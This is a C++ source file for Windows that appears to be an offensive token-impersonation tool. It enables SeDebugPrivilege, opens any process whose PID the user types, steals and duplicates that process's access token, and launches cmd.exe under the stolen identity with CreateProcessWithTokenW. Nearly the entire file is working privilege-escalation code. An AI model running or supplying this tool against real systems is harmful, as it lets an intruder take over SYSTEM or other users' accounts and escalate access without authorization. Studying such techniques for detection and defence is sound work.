#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <comdef.h>

using namespace std;

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
string GetUsername();
HANDLE GetProcessTokenHandle(DWORD processIdToImpersonate);
BOOL ImpersonateUserAndCreateProcess(HANDLE tokenHandle);

class TokenException : public exception
{
public:
    TokenException(const char* message) : exception(message) {}
};

class ProcessException : public exception
{
public:
    ProcessException(const char* message) : exception(message) {}
};

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID privilegeLuid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &privilegeLuid))
    {
        throw TokenException("Failed to lookup privilege value.");
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = privilegeLuid;
    tokenPrivileges.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        throw TokenException("Failed to adjust token privileges.");
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        throw TokenException("Not all privileges are assigned.");
    }

    return TRUE;
}

string GetUsername()
{
    TCHAR username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    GetUserName(username, &usernameLen);
    wstring usernameW(username);
    string usernameS(usernameW.begin(), usernameW.end());
    return usernameS;
}

HANDLE GetProcessTokenHandle(DWORD processIdToImpersonate)
{
    HANDLE currentTokenHandle = NULL;

    BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
    SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE);

    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, processIdToImpersonate);
    if (GetLastError() != NULL)
    {
        processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, processIdToImpersonate);
    }

    HANDLE tokenHandle = NULL;
    BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);

    CloseHandle(currentTokenHandle);
    CloseHandle(processHandle);

    if (getToken == 0)
    {
        throw TokenException("Failed to get token handle.");
    }

    return tokenHandle;
}

BOOL ImpersonateUserAndCreateProcess(HANDLE tokenHandle)
{
    BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
    if (impersonateUser)
    {
        printf("[+] Current user is: %s\n", (GetUsername()).c_str());
        RevertToSelf();
    }

    HANDLE duplicateTokenHandle = NULL;
    BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);

    if (duplicateToken == 0)
    {
        throw TokenException("Failed to duplicate token.");
    }

    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;

    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);

    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);

    CloseHandle(duplicateTokenHandle);

    if (!createProcess)
    {
        throw ProcessException("Failed to create a new process.");
    }

    return createProcess;
}

int main()
{
    char processIdInput[10];
    DWORD processIdToImpersonate;
    HANDLE tokenHandle;
    BOOL impersonateSuccess;

    do
    {
        cout << "Enter the PID of the process to impersonate (or enter '0' to exit): ";
        cin.getline(processIdInput, sizeof(processIdInput));

        if (strcmp(processIdInput, "0") == 0)
        {
            break; // Exit the loop if the user enters '0'
        }

        processIdToImpersonate = atoi(processIdInput);
        tokenHandle = GetProcessTokenHandle(processIdToImpersonate);

        if (tokenHandle == NULL)
        {
            printf("Failed to get the token handle.\n");
            continue; // Continue to the next iteration if getting the token handle fails
        }

        impersonateSuccess = ImpersonateUserAndCreateProcess(tokenHandle);
        if (!impersonateSuccess)
        {
            printf("Failed to impersonate user.\n");
        }

        CloseHandle(tokenHandle);
    } while (true);

    return 0;
}